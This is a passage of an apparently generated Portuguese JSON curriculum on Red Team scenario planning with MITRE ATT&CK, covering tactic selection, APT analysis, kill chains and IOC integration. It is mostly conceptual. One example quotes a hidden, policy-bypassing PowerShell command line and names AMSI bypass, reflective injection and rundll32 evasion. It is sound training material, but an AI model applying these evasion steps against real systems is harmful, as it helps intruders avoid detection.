                                  "estimatedTime": "75 minutos",
                                  "materials": [
                                    "Planilha Google Sheets ou Excel",
                                    "ATT&CK Navigator com layer salva"
                                  ],
                                  "tips": "Priorize táticas de alto impacto e baixa detecção para realismo em jogos de guerra.",
                                  "learningObjective": "Desenvolver habilidade em correlacionar cenários reais com táticas padronizadas.",
                                  "commonMistakes": "Sobrecarregar com muitas táticas; foque em 3-5 por fase."
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Selecionar, Justificar e Validar Táticas Finais",
                                  "subSteps": [
                                    "Selecione 3-5 táticas principais baseadas no mapeamento.",
                                    "Escreva justificativas detalhadas para cada seleção.",
                                    "Simule o caminho no Navigator e identifique gaps.",
                                    "Teste viabilidade com uma mini-simulação ou walkthrough.",
                                    "Documente plano final com táticas, ordem e contingências."
                                  ],
                                  "verification": "Gere um relatório final com seleção justificada e layer exportada do Navigator.",
                                  "estimatedTime": "45 minutos",
                                  "materials": [
                                    "ATT&CK Navigator para exportar layer JSON",
                                    "Template de relatório"
                                  ],
                                  "tips": "Sempre pergunte: 'Essa tática avança o objetivo sem alertar defensores excessivamente?'",
                                  "learningObjective": "Capacitar seleção precisa e defensável de táticas para cenários operacionais.",
                                  "commonMistakes": "Selecionar táticas genéricas sem justificativa contextual."
                                }
                              ],
                              "practicalExample": "Para um cenário de simulação de phishing em uma empresa: 1) Analise objetivo (acesso inicial via email); 2) Explore TA0001 Initial Access; 3) Mapeie sub-técnicas como T1566 Phishing; 4) Selecione e justifique TA0001 → TA0002 Execution, criando layer no Navigator mostrando caminho de spearphishing para code execution.",
                              "finalVerifications": [
                                "Pode listar e justificar 3+ táticas corretas para um cenário dado (ex: phishing → TA0001).",
                                "Exporta layer funcional no ATT&CK Navigator alinhada ao cenário.",
                                "Identifica sequências lógicas de táticas sem gaps evidentes.",
                                "Justificativas incluem viabilidade e alinhamento com objetivos.",
                                "Diferencia corretamente táticas de técnicas em exemplos.",
                                "Adapta seleção para variações no cenário (ex: pivoting → TA0008)."
                              ],
                              "assessmentCriteria": [
                                "Precisão na seleção de táticas (alinhamento 90%+ com cenário).",
                                "Qualidade das justificativas (detalhadas e baseadas em evidências ATT&CK).",
                                "Completude do mapeamento (cobertura de fases chave sem sobrecarga).",
                                "Uso efetivo do Navigator (layers salvas e exportadas corretamente).",
                                "Criatividade e realismo nas sequências de táticas.",
                                "Identificação de erros comuns e contingências."
                              ],
                              "crossCurricularConnections": [
                                "Análise de Riscos (SC-02): Avaliar impacto de táticas em ativos críticos.",
                                "Programação de Simulações (SC-07): Codificar táticas em ferramentas como Atomic Red Team.",
                                "Inteligência de Ameaças (SC-01): Integrar IOCs de grupos APT ao mapeamento.",
                                "Defesa Cibernética (SC-05): Antecipar detecções em táticas selecionadas."
                              ],
                              "realWorldApplication": "Em operações de Red Team, selecionar TA0008 Lateral Movement para pivoting em redes corporativas durante pentests autorizados, permitindo simulações realistas de APTs como o usado no ataque à Colonial Pipeline, melhorando readiness defensiva sem comprometer sistemas reais."
                            },
                            "estimatedTime": "2 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.4.5.2.2",
                            "name": "Mapear Técnicas e Sub-Técnicas",
                            "description": "Associar técnicas específicas (ex.: T1566 Phishing) a táticas e documentar procedimentos personalizados, criando um perfil de ameaça customizado para Red Team.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Identificar Técnicas e Sub-Técnicas Relevantes",
                                  "subSteps": [
                                    "Acesse o framework MITRE ATT&CK e navegue pela matriz de Enterprise.",
                                    "Selecione táticas ofensivas baseadas no cenário de ameaça (ex.: Initial Access).",
                                    "Liste técnicas específicas (ex.: T1566 Phishing) e sub-técnicas associadas.",
                                    "Registre IDs, descrições e exemplos de uso de adversários conhecidos.",
                                    "Priorize técnicas com alto impacto para o Red Team."
                                  ],
                                  "verification": "Lista completa de 5-10 técnicas com IDs e descrições documentadas em um documento inicial.",
                                  "estimatedTime": "2-3 horas",
                                  "materials": "Acesso ao site MITRE ATT&CK, navegador web, editor de texto (ex.: Notion ou Markdown).",
                                  "tips": "Use filtros de busca por nome de grupo APT para relevância contextual.",
                                  "learningObjective": "Dominar a navegação e extração de dados do MITRE ATT&CK.",
                                  "commonMistakes": "Ignorar sub-técnicas ou confundir técnicas de diferentes matrizes (Enterprise vs. Mobile)."
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Mapear Técnicas a Táticas Superiores",
                                  "subSteps": [
                                    "Para cada técnica identificada, localize sua tática pai (ex.: T1566 -> TA0001 Initial Access).",
                                    "Crie uma tabela de mapeamento: Tática | Técnica | Sub-Técnica | Justificativa.",
                                    "Analise relações entre táticas (ex.: chains de kill chain).",
                                    "Inclua referências a relatórios de threat intelligence.",
                                    "Valide mapeamentos cruzando com múltiplas fontes."
                                  ],
                                  "verification": "Tabela de mapeamento preenchida com pelo menos 80% das técnicas associadas corretamente.",
                                  "estimatedTime": "3-4 horas",
                                  "materials": "Planilha (Google Sheets/Excel), MITRE ATT&CK Navigator.",
                                  "tips": "Use o ATT&CK Navigator para visualização gráfica de mapeamentos.",
                                  "learningObjective": "Entender hierarquia TTPs e criar representações visuais de ataques.",
                                  "commonMistakes": "Mapear incorretamente devido a sobreposições de táticas; sempre cheque a matriz oficial."
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Documentar Procedimentos Personalizados",
                                  "subSteps": [
                                    "Para cada técnica, descreva adaptações para o Red Team (ex.: phishing customizado com payload).",
                                    "Detalhe passos de execução, ferramentas (ex.: Gophish para T1566) e mitigações esperadas.",
                                    "Inclua variáveis como alvos, ambiente e regras de engajamento.",
                                    "Adicione riscos legais/éticos e planos de contenção.",
                                    "Formate como procedimentos passo-a-passo reutilizáveis."
                                  ],
                                  "verification": "Documentos de procedimentos com 3-5 técnicas detalhadas e testáveis.",
                                  "estimatedTime": "4-5 horas",
                                  "materials": "Ferramentas de documentação (ex.: Confluence, Markdown), exemplos de playbooks Red Team.",
                                  "tips": "Baseie-se em templates de Atomic Red Team para padronização.",
                                  "learningObjective": "Desenvolver playbooks personalizados alinhados a TTPs reais.",
                                  "commonMistakes": "Omitir considerações éticas; sempre incluir seção de RoE (Rules of Engagement)."
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Criar e Validar Perfil de Ameaça Customizado",
                                  "subSteps": [
                                    "Compile mapeamentos e procedimentos em um perfil unificado (ex.: JSON/YAML ou relatório).",
                                    "Adicione metadados: nome do ator simulado, objetivos, escopo.",
                                    "Simule walkthrough de um ataque chain usando o perfil.",
                                    "Revise por completude e colete feedback de pares.",
                                    "Atualize com lições aprendidas."
                                  ],
                                  "verification": "Perfil de ameaça final gerado, validado por simulação e revisado.",
                                  "estimatedTime": "2-3 horas",
                                  "materials": "Editor JSON/YAML, ferramenta de diagramação (ex.: Draw.io para attack flows).",
                                  "tips": "Exporte do ATT&CK Navigator como JSON para base do perfil.",
                                  "learningObjective": "Integrar TTPs em perfis de ameaça acionáveis para operações Red Team.",
                                  "commonMistakes": "Perfil muito genérico; torne-o específico ao cenário do cliente."
                                }
                              ],
                              "practicalExample": "Para simular APT29 (Cozy Bear), mapeie T1566 Phishing (TA0001) com sub-técnica de spear-phishing anexos; documente: 1) Coleta de emails via OSINT, 2) Craft payload com Cobalt Strike, 3) Envio via SMTP customizado, criando perfil 'CozyBear-PhishOps' com chain para T1078 Valid Accounts.",
                              "finalVerifications": [
                                "Todos mapeamentos de técnicas a táticas estão corretos conforme MITRE ATT&CK.",
                                "Procedimentos incluem pelo menos 3 adaptações personalizadas por técnica.",
                                "Perfil de ameaça é exportável em formato JSON/YAML e visualizável.",
                                "Simulação de chain de ataque completa sem erros lógicos.",
                                "Documentação cobre riscos éticos e RoE.",
                                "Feedback de revisão incorporado com pelo menos 2 iterações."
                              ],
                              "assessmentCriteria": [
                                "Precisão no mapeamento TTPs (90%+ acurácia).",
                                "Detalhamento de subSteps (mínimo 4 por procedimento).",
                                "Relevância e customização para Red Team (alto impacto simulado).",
                                "Completude do perfil (inclui visuals e metadados).",
                                "Clareza e usabilidade da documentação.",
                                "Validação prática via simulação ou walkthrough."
                              ],
                              "crossCurricularConnections": [
                                "Inteligência de Ameaças (SC-02): Análise de relatórios IOCs/IOAs.",
                                "Análise de Malware (SC-04): Reversing payloads em técnicas Execution.",
                                "Defesa em Camadas (SC-07): Identificação de detecções em táticas.",
                                "Gestão de Incidentes (SC-09): Planejamento de resposta a chains mapeados."
                              ],
                              "realWorldApplication": "Em engajamentos Red Team, use o perfil para planejar campanhas de phishing autorizadas, simulando APTs reais, melhorando detecção Blue Team e conformidade com frameworks como NIST 800-53."
                            },
                            "estimatedTime": "3 horas",
                            "difficulty": "advanced",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.4.5.2.3",
                            "name": "Analisar Grupos de Adversários (APTs)",
                            "description": "Estudar perfis de grupos MITRE ATT&CK (ex.: APT29) para extrair TTPs reais e adaptá-los a cenários de jogos cibernéticos ofensivos.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Selecionar e Pesquisar Perfil de um Grupo APT",
                                  "subSteps": [
                                    "Escolha um grupo APT específico do MITRE ATT&CK Navigator, como APT29 (Cozy Bear).",
                                    "Acesse o site oficial do MITRE ATT&CK e navegue até a página do grupo selecionado.",
                                    "Colete dados iniciais: nome, aliases, país de origem, setores visados e datas de atividade.",
                                    "Registre links para relatórios relacionados e fontes primárias (ex.: FireEye, Mandiant).",
                                    "Crie um resumo inicial de 200-300 palavras sobre o histórico do grupo."
                                  ],
                                  "verification": "Verifique se possui um documento com resumo completo, links e fontes citadas.",
                                  "estimatedTime": "1-2 horas",
                                  "materials": [
                                    "Acesso à internet",
                                    "MITRE ATT&CK Navigator",
                                    "Notebook ou editor de texto (ex.: Notion, Obsidian)"
                                  ],
                                  "tips": "Priorize grupos com perfis bem documentados para evitar lacunas de dados.",
                                  "learningObjective": "Identificar e compilar informações básicas sobre um APT para contextualizar análises futuras.",
                                  "commonMistakes": [
                                    "Escolher grupos com pouca documentação",
                                    "Ignorar fontes primárias em favor de resumos genéricos",
                                    "Não citar fontes adequadamente"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Extrair e Categorizar TTPs do Perfil MITRE ATT&CK",
                                  "subSteps": [
                                    "Use o MITRE ATT&CK Navigator para visualizar a matriz de TTPs associada ao grupo.",
                                    "Liste todas as táticas (ex.: Reconnaissance, Initial Access) e técnicas específicas (ex.: T1566 Phishing).",
                                    "Categorize TTPs por fase do ciclo de vida do ataque (ex.: pré-ATA, execução, pós-exploração).",
                                    "Anote exemplos reais de uso pelo grupo, incluindo mitigações sugeridas pelo MITRE.",
                                    "Crie uma tabela ou grafo com TTPs mapeados, priorizando os mais frequentes."
                                  ],
                                  "verification": "Confirme a existência de uma tabela ou diagrama com pelo menos 10-15 TTPs categorizados.",
                                  "estimatedTime": "2-3 horas",
                                  "materials": [
                                    "MITRE ATT&CK Navigator (online ou desktop)",
                                    "Ferramentas de diagramação (ex.: Draw.io, Lucidchart)",
                                    "Planilha (Google Sheets ou Excel)"
                                  ],
                                  "tips": "Filtre por 'Used by [grupo]' no Navigator para TTPs confirmados.",
                                  "learningObjective": "Mapear TTPs reais de um APT usando o framework MITRE ATT&CK de forma sistemática.",
                                  "commonMistakes": [
                                    "Confundir táticas com técnicas",
                                    "Ignorar sub-técnicas",
                                    "Não considerar variações por campanha"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Analisar TTPs em Contexto Ofensivo para Jogos Cibernéticos",
                                  "subSteps": [
                                    "Avalie a viabilidade de cada TTP em cenários simulados (ex.: rede lab virtual).",
                                    "Identifique TTPs de alto impacto para ofensiva (ex.: lateral movement via T1021).",
                                    "Compare TTPs do APT com cenários de jogos de guerra cibernética (ex.: Cobalt Strike beacons).",
                                    "Avalie detecções potenciais e adaptações para evasão em simulações.",
                                    "Priorize 5-7 TTPs chave baseados em realismo e complexidade."
                                  ],
                                  "verification": "Tenha uma lista priorizada de TTPs com análise de viabilidade e adaptações anotadas.",
                                  "estimatedTime": "2-3 horas",
                                  "materials": [
                                    "Ambiente de lab virtual (ex.: VirtualBox com Kali/Win VMs)",
                                    "Documentação de ferramentas ofensivas (Metasploit, Empire)"
                                  ],
                                  "tips": "Pense em 'blue team' perspectiva: como seria detectado em um jogo real?",
                                  "learningObjective": "Avaliar TTPs de APTs para relevância em simulações ofensivas cibernéticas.",
                                  "commonMistakes": [
                                    "Focar só em TTPs iniciais, ignorando persistência",
                                    "Não considerar restrições éticas/legais de labs",
                                    "Sobrestimar viabilidade sem testes"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Adaptar TTPs para Cenários de Jogos de Guerra Cibernética",
                                  "subSteps": [
                                    "Crie um cenário fictício baseado no APT (ex.: APT29 atacando setor energia).",
                                    "Adapte TTPs selecionados ao cenário: defina alvos, sequências e variáveis.",
                                    "Desenvolva regras de engajamento e métricas de sucesso para o jogo.",
                                    "Documente o cenário completo em formato playbook (ex.: YAML ou Markdown).",
                                    "Teste o cenário em um lab simples para validar fluxo."
                                  ],
                                  "verification": "Documento de playbook completo com cenário testado e feedback inicial.",
                                  "estimatedTime": "3-4 horas",
                                  "materials": [
                                    "Ferramentas de simulação (ex.: Atomic Red Team, Caldera)",
                                    "Editor de Markdown ou Git para versionamento"
                                  ],
                                  "tips": "Mantenha cenários realistas mas escaláveis para diferentes níveis de jogadores.",
                                  "learningObjective": "Transformar TTPs reais em cenários acionáveis para treinamento cibernético.",
                                  "commonMistakes": [
                                    "Cenários muito complexos para iniciantes",
                                    "Não incluir defesas blue team",
                                    "Falta de métricas mensuráveis"
                                  ]
                                }
                              ],
                              "practicalExample": "Analise o APT29: extraia TTPs como T1078 (Valid Accounts) e adapte para um cenário onde atacantes roubam credenciais via spear-phishing em uma simulação de rede corporativa, usando Empire para persistência e simulando exfiltração de dados sensíveis.",
                              "finalVerifications": [
                                "Playbook de cenário completo com TTPs mapeados e testado em lab.",
                                "Tabela de TTPs categorizados com fontes MITRE citadas.",
                                "Análise de viabilidade para pelo menos 5 TTPs ofensivos.",
                                "Identificação de 3+ conexões com frameworks de threat hunting.",
                                "Relatório de 1 página resumindo adaptações e lições aprendidas."
                              ],
                              "assessmentCriteria": [
                                "Precisão na extração de TTPs (100% match com MITRE).",
                                "Profundidade da análise contextual (cobertura de fases ATA).",
                                "Criatividade e realismo nas adaptações de cenários.",
                                "Qualidade da documentação (clareza, versionamento).",
                                "Validação prática via lab (evidências de testes).",
                                "Cobertura de mitigações e detecções potenciais."
                              ],
                              "crossCurricularConnections": [
                                "Inteligência de Ameaças ( Threat Intelligence )",
                                "Análise de Malware e Reversing",
                                "Red Teaming e Purple Teaming",
                                "Modelagem de Dados e Visualização (gráficos de TTPs)",
                                "Ética e Conformidade em Cibersegurança"
                              ],
                              "realWorldApplication": "Em equipes de Red Team de empresas como Mandiant ou governos, analistas usam essa skill para criar exercícios realistas baseados em APTs reais, melhorando defesas contra ameaças persistentes em infraestruturas críticas."
                            },
                            "estimatedTime": "2 horas",
                            "difficulty": "advanced",
                            "status": "not_started",
                            "prerequisites": []
                          }
                        ]
                      },
                      {
                        "id": "10.1.4.5.3",
                        "name": "Aplicação em Planejamento de Cenários",
                        "description": "Integração do framework ATT&CK no planejamento de cenários de ameaça ofensivos, alinhando com regras de engajamento e criando narrativas realistas para operações de Red Team.",
                        "specificSkills": [
                          {
                            "id": "10.1.4.5.3.1",
                            "name": "Construir Cadeias de Ataque com ATT&CK",
                            "description": "Desenvolver sequências lógicas de TTPs formando uma kill chain ofensiva, desde Reconnaissance até Impact, utilizando ferramentas como ATT&CK Navigator para visualização.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Familiarizar-se com a Matriz MITRE ATT&CK e suas Fases",
                                  "subSteps": [
                                    "Acesse o site oficial do MITRE ATT&CK e explore a visão geral das 14 táticas (Reconnaissance até Impact).",
                                    "Identifique as fases principais da kill chain: Reconnaissance, Resource Development, Initial Access, Execution, Persistence, Privilege Escalation, Defense Evasion, Credential Access, Discovery, Lateral Movement, Collection, Command and Control, Exfiltration, Impact.",
                                    "Estude exemplos de técnicas (TTPs) em cada tática usando o navegador de táticas.",
                                    "Anote 3-5 TTPs por fase para referência futura.",
                                    "Crie um mapa mental simples das táticas em sequência."
                                  ],
                                  "verification": "Capacidade de listar e descrever corretamente as 14 táticas em ordem e fornecer pelo menos um exemplo de TTP por tática.",
                                  "estimatedTime": "1 hora",
                                  "materials": [
                                    "Site MITRE ATT&CK (attack.mitre.org)",
                                    "Notebook ou ferramenta de mind mapping (ex: Draw.io, XMind)"
                                  ],
                                  "tips": "Comece pelas táticas iniciais como Reconnaissance para construir compreensão sequencial; use filtros no site para focar em Enterprise.",
                                  "learningObjective": "Compreender a estrutura hierárquica da matriz ATT&CK e suas táticas como base para cadeias de ataque.",
                                  "commonMistakes": [
                                    "Confundir táticas com técnicas (táticas são fases amplas, técnicas são métodos específicos).",
                                    "Ignorar pré-requisitos como Resource Development."
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Mapear Objetivos e Cenário do Ataque",
                                  "subSteps": [
                                    "Defina o objetivo final do ataque (ex: roubo de dados, ransomware, disrupção).",
                                    "Escolha um alvo simulado (ex: empresa com Active Directory).",
                                    "Identifique restrições realistas (ex: detecção por EDR, rede segmentada).",
                                    "Liste pré-condições necessárias (ex: domínio público do alvo).",
                                    "Crie um diagrama inicial da kill chain vazia com as 14 táticas."
                                  ],
                                  "verification": "Documento com objetivo claro, alvo, restrições e diagrama inicial da kill chain preenchido com táticas.",
                                  "estimatedTime": "45 minutos",
                                  "materials": [
                                    "Ferramenta de diagramação (Draw.io ou papel e caneta)",
                                    "Documentos de cenário hipotético"
                                  ],
                                  "tips": "Alinhe o objetivo com táticas de Impact para guiar a sequência reversa (top-down).",
                                  "learningObjective": "Definir contexto e objetivos para guiar a construção lógica da cadeia de ataque.",
                                  "commonMistakes": [
                                    "Definir objetivos muito vagos, como 'hackear tudo'.",
                                    "Ignorar defesas do alvo no planejamento inicial."
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Selecionar e Sequenciar TTPs Lógicos",
                                  "subSteps": [
                                    "Para cada tática, selecione 1-3 TTPs relevantes ao cenário (ex: T1595 Active Scanning em Reconnaissance).",
                                    "Garanta dependências lógicas: saída de uma tática alimenta a próxima (ex: phishing leva a Initial Access).",
                                    "Evite saltos: justifique transições entre táticas.",
                                    "Adicione mitigações potenciais para cada TTP.",
                                    "Revise a sequência completa para cobertura de Recon a Impact."
                                  ],
                                  "verification": "Lista sequencial de 10-20 TTPs com justificativas de dependência e mitigações.",
                                  "estimatedTime": "1.5 horas",
                                  "materials": [
                                    "Matriz ATT&CK impressa ou em navegador",
                                    "Planilha Excel/Google Sheets para rastrear TTPs"
                                  ],
                                  "tips": "Use IDs de TTPs (ex: T1566 Phishing) para precisão; priorize TTPs comuns em relatórios de threat intel.",
                                  "learningObjective": "Construir sequências de TTPs interdependentes formando uma kill chain coerente.",
                                  "commonMistakes": [
                                    "Selecionar TTPs independentes sem fluxo lógico.",
                                    "Sobrecarregar com TTPs desnecessários, tornando a cadeia irrealista."
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Visualizar a Cadeia com ATT&CK Navigator",
                                  "subSteps": [
                                    "Baixe e abra o ATT&CK Navigator (navigator.tooling.mitreaattack.org).",
                                    "Crie uma nova layer e adicione seus TTPs selecionados via busca por ID ou nome.",
                                    "Ajuste scores de confiança e impacto para destacar caminhos críticos.",
                                    "Exporte visualizações (JSON, SVG) e anote caminhos da kill chain.",
                                    "Compartilhe layer via URL para revisão."
                                  ],
                                  "verification": "Layer funcional no Navigator com TTPs destacados, exportada e com anotação de sequência.",
                                  "estimatedTime": "1 hora",
                                  "materials": [
                                    "ATT&CK Navigator (online ou local)",
                                    "Lista de TTPs do step anterior"
                                  ],
                                  "tips": "Use heatmaps para identificar gaps; teste com datasets de grupos reais como APT28.",
                                  "learningObjective": "Utilizar ferramentas de visualização para representar e analisar cadeias de ataque.",
                                  "commonMistakes": [
                                    "Adicionar TTPs incorretos via busca errada.",
                                    "Não salvar/exportar a layer adequadamente."
                                  ]
                                },
                                {
                                  "stepNumber": 5,
                                  "title": "Validar, Refinar e Documentar a Cadeia",
                                  "subSteps": [
                                    "Simule a execução mentalmente: verifique viabilidade contra defesas comuns.",
                                    "Identifique gaps e adicione TTPs alternativos.",
                                    "Calcule tempo estimado e recursos para a cadeia completa.",
                                    "Documente em formato estruturado (ex: tabela com TTP, ferramenta, detecção).",
                                    "Teste contra cenários defensivos (Blue Team perspective)."
                                  ],
                                  "verification": "Relatório final com cadeia validada, gaps resolvidos e documentação completa.",
                                  "estimatedTime": "45 minutos",
                                  "materials": [
                                    "Relatórios de threat intel (ex: Atomic Red Team)",
                                    "Ferramenta de documentação (Markdown ou Word)"
                                  ],
                                  "tips": "Valide reversamente do Impact para Recon para garantir completude.",
                                  "learningObjective": "Refinar cadeias para realismo e usabilidade em simulações.",
                                  "commonMistakes": [
                                    "Não considerar detecções, tornando a cadeia irrealista.",
                                    "Documentar sem justificativas lógicas."
                                  ]
                                }
                              ],
                              "practicalExample": "Para simular um ataque de ransomware em uma empresa: Recon (T1595: Active Scanning do site corporativo) -> Initial Access (T1566: Phishing com spear-phishing) -> Execution (T1059: Command and Scripting Interpreter via PowerShell) -> Persistence (T1547: Boot or Logon Autostart) -> Lateral Movement (T1021: Remote Services via RDP) -> Exfiltration (T1041: Exfiltration Over C2 Channel) -> Impact (T1486: Data Encrypted for Impact). Visualize no Navigator destacando esse caminho.",
                              "finalVerifications": [
                                "Construir uma kill chain completa de pelo menos 12 TTPs cobrindo todas as táticas principais.",
                                "Criar e compartilhar uma layer funcional no ATT&CK Navigator.",
                                "Explicar dependências lógicas entre 5 pares consecutivos de TTPs.",
                                "Identificar 3 mitigações defensivas para a cadeia.",
                                "Simular execução em whiteboard ou ferramenta visual.",
                                "Documentar cadeia em formato reutilizável (JSON/Markdown)."
                              ],
                              "assessmentCriteria": [
                                "Lógica e completude da sequência de TTPs (30%)",
                                "Precisão na seleção de TTPs relevantes ao cenário (25%)",
                                "Qualidade da visualização no ATT&CK Navigator (20%)",
                                "Análise de viabilidade e mitigações (15%)",
                                "Clareza da documentação final (10%)"
                              ],
                              "crossCurricularConnections": [
                                "Análise de Redes: Mapeamento de tráfego para validar C2 e Exfiltration.",
                                "Programação: Scripts Python para automação de testes Atomic Red Team.",
                                "Inteligência de Ameaças: Integração com relatórios de IOCs de threat actors.",
                                "Estratégia e Táticas Militares: Analogia com OODA Loop em operações cibernéticas.",
                                "Gestão de Projetos: Sequenciamento de tarefas em Gantt para simulações."
                              ],
                              "realWorldApplication": "Em operações de Red Team, equipes constroem cadeias ATT&CK para simular ataques APT em exercícios de pentest, permitindo que Blue Teams testem detecções e respostas; usado por analistas SOC para prever vetores de ataque baseados em threat intel."
                            },
                            "estimatedTime": "3 horas",
                            "difficulty": "advanced",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.4.5.3.2",
                            "name": "Integrar IOCs e Mitigações",
                            "description": "Incorporar Indicadores de Compromisso (IOCs) extraídos de técnicas ATT&CK em cenários, prevendo detecções Blue Team e estratégias de evasão.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Identificar e Extrair IOCs de Técnicas MITRE ATT&CK",
                                  "subSteps": [
                                    "Acesse o MITRE ATT&CK Navigator ou framework online.",
                                    "Selecione uma técnica específica (ex: T1566 Phishing).",
                                    "Liste IOCs associados: hashes de malware, IPs, domínios, YARA rules.",
                                    "Categorize IOCs por tipo (network, file, registry).",
                                    "Valide IOCs com fontes adicionais como VirusTotal."
                                  ],
                                  "verification": "Crie uma tabela com pelo menos 5 IOCs extraídos, incluindo tipo, valor e fonte.",
                                  "estimatedTime": "1 hora",
                                  "materials": [
                                    "MITRE ATT&CK Navigator",
                                    "VirusTotal account",
                                    "Planilha ou notebook"
                                  ],
                                  "tips": [
                                    "Priorize IOCs de alta fidelidade e recentes.",
                                    "Use filtros por matriz (Enterprise, Mobile)."
                                  ],
                                  "learningObjective": "Dominar a extração precisa de IOCs de técnicas ATT&CK para uso em cenários.",
                                  "commonMistakes": [
                                    "Extrair táticas em vez de técnicas.",
                                    "Ignorar contexto temporal dos IOCs.",
                                    "Listar IOCs genéricos sem especificidade."
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Incorporar IOCs em Cenários de Ataque Simulados",
                                  "subSteps": [
                                    "Defina o escopo do cenário: ator de ameaça, alvo e objetivos.",
                                    "Mapeie a técnica ATT&CK ao kill chain do cenário.",
                                    "Insira IOCs em etapas específicas (ex: IOC de URL no estágio inicial).",
                                    "Crie narrativa detalhada com timestamps e sequências lógicas.",
                                    "Simule o fluxo com diagrama ou storyboard."
                                  ],
                                  "verification": "Produza um documento de cenário com IOCs integrados e fluxo visual.",
                                  "estimatedTime": "1.5 horas",
                                  "materials": [
                                    "Ferramenta de diagramação (Draw.io)",
                                    "Templates de cenários ATT&CK",
                                    "Document editor"
                                  ],
                                  "tips": [
                                    "Garanta realismo alinhando IOCs à sofisticação do ator.",
                                    "Use variáveis para IOCs dinâmicos."
                                  ],
                                  "learningObjective": "Integrar IOCs de forma coesa em narrativas de ataque acionáveis.",
                                  "commonMistakes": [
                                    "Sobrecarregar o cenário com IOCs irrelevantes.",
                                    "Ignorar dependências entre IOCs.",
                                    "Falta de sequência temporal."
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Prever Detecções e Respostas Blue Team",
                                  "subSteps": [
                                    "Identifique ferramentas Blue Team comuns (SIEM, EDR, NDR).",
                                    "Mapeie IOCs a regras de detecção (ex: hash em Sigma rules).",
                                    "Simule alertas: tempo de detecção, falsos positivos.",
                                    "Avalie impacto: triage, investigação e resposta.",
                                    "Documente cenários de detecção em uma matriz."
                                  ],
                                  "verification": "Gere uma matriz de detecções com pelo menos 4 ferramentas e IOCs mapeados.",
                                  "estimatedTime": "1 hora",
                                  "materials": [
                                    "Sigma rules repository",
                                    "Lista de ferramentas EDR/SIEM",
                                    "Matriz template"
                                  ],
                                  "tips": [
                                    "Considere detecções comportamentais além de IOCs estáticos.",
                                    "Pense em ruído e fadiga de alertas."
                                  ],
                                  "learningObjective": "Antecipar detecções Blue Team para refinar cenários ofensivos.",
                                  "commonMistakes": [
                                    "Subestimar detecções baseadas em ML.",
                                    "Ignorar integrações entre ferramentas.",
                                    "Focar só em detecções perfeitas."
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Desenvolver Mitigações e Estratégias de Evasão",
                                  "subSteps": [
                                    "Analise fraquezas das detecções identificadas.",
                                    "Proponha evasões: Obfuscação, LOLBins, técnicas adversárias.",
                                    "Integre mitigações ATT&CK (ex: M1036 Account Use Policies).",
                                    "Teste evasões em ambiente simulado (ex: Atomic Red Team).",
                                    "Atualize o cenário com evasões e reavalie detecções."
                                  ],
                                  "verification": "Atualize o cenário com 3+ estratégias de evasão e nova matriz de detecções.",
                                  "estimatedTime": "1.5 horas",
                                  "materials": [
                                    "Atomic Red Team repo",
                                    "ATT&CK Mitigations layer",
                                    "Ambiente de lab virtual (VirtualBox)"
                                  ],
                                  "tips": [
                                    "Priorize evasões stealthy e persistentes.",
                                    "Documente trade-offs de eficácia vs. detecção."
                                  ],
                                  "learningObjective": "Criar cenários resilientes com evasões e mitigações integradas.",
                                  "commonMistakes": [
                                    "Evasões óbvias que triggeram detecções.",
                                    "Ignorar custos operacionais das evasões.",
                                    "Não iterar após testes."
                                  ]
                                }
                              ],
                              "practicalExample": "Para técnica T1059 Command and Scripting Interpreter (PowerShell), extraia IOCs como 'powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden'; integre em cenário de lateral movement em rede corporativa; preveja detecção por Sysmon EID 1 com argumentos suspeitos em SIEM; evada usando AMSI bypass via reflective PE injection e LOLBin (rundll32.exe).",
                              "finalVerifications": [
                                "Lista completa de IOCs extraídos e categorizados corretamente.",
                                "Cenário narrativo com IOCs integrados logicamente no kill chain.",
                                "Matriz de detecções Blue Team precisa e abrangente.",
                                "Estratégias de evasão testadas e documentadas com evidências.",
                                "Cenário atualizado equilibra realismo, stealth e efetividade.",
                                "Conexão clara entre IOCs, detecções e mitigações."
                              ],
                              "assessmentCriteria": [
                                "Precisão na extração de IOCs (90% match com fontes ATT&CK).",
                                "Coerência e realismo do cenário integrado (nota 4/5).",
                                "Abrangência das previsões de detecção (cobertura de 80% ferramentas comuns).",
                                "Criatividade e viabilidade das estratégias de evasão (testáveis em lab).",
                                "Documentação clara com diagramas e matrizes (formato profissional).",
                                "Integração holística de todos elementos (sem lacunas lógicas)."
                              ],
                              "crossCurricularConnections": [
                                "Inteligência de Ameaças: Análise e enriquecimento de IOCs.",
                                "Defesa Cibernética: Desenvolvimento de regras de detecção.",
                                "Programação e Automação: Scripts para simulação de IOCs.",
                                "Análise de Dados: Processamento e correlação de IOCs em SIEM.",
                                "Simulações e Jogos: Design de wargames com cenários dinâmicos."
                              ],
                              "realWorldApplication": "Em operações Red Team e Purple Team, permite criar exercícios de simulação que testam defesas reais sem exposição prematura, aprimorando detecção e resposta em SOCs corporativos ou agências governamentais."
                            },
                            "estimatedTime": "2 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.4.5.3.3",
                            "name": "Validar Cenários contra Frameworks Complementares",
